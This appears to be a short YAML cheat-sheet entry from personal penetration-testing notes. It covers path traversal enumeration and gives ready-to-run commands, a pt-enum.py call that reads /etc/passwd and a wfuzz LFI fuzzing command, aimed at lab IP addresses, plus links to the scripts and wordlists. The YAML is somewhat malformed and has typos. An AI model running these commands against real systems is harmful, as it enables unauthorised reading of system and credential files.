---
functions:
  enumeration:
    - description: Use a script to automatically exploit a path traversal vulnerability
                   and output results
      code: |
        pt-enum.py --base-url "http://10.10.10.194/news.php?file=" --path "../../../.." --file "/etc/passwd"
        pt-enum.py --base-url "http://10.10.10.194/news.php?file=" --path "../../../.." --list /home/unknown/Documents/Scripts/path-traversal/linux

    - description: Use wffuz to grab files form path path_traversal
    	wfuzz -u http://10.10.10.249/admin../admin_staging/index.php\?page\=../../../../../../../../..FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt

    	hide invalid entries: --hc=15349  (--hc/hl/hw/hh)  code/lines/words/chars

resources: |
  https://raw.githubusercontent.com/MidnightSeer/scripts/master/pt-enum.py
  https://raw.githubusercontent.com/MidnightSeer/scripts/master/path_traversal_linux
  https://raw.githubusercontent.com/MidnightSeer/scripts/master/path_traversal_windows
---
